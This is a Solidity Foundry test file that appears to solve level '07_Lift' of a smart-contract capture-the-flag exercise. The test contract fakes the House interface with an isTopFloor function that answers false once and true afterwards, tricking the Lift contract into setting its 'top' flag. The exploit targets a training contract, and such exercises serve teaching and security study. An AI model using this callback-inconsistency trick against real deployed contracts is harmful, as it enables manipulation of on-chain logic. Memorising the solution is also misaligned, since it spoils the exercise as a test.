// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is House, BaseTest {
    Lift instance;
    bool isTop = true;

    function isTopFloor(uint256) external override returns (bool) {
        if (isTop) {
            isTop = false;
            return isTop;
        }
        return true;
    }

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        instance.goToFloor(13);

        checkSuccess();
    }


    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}
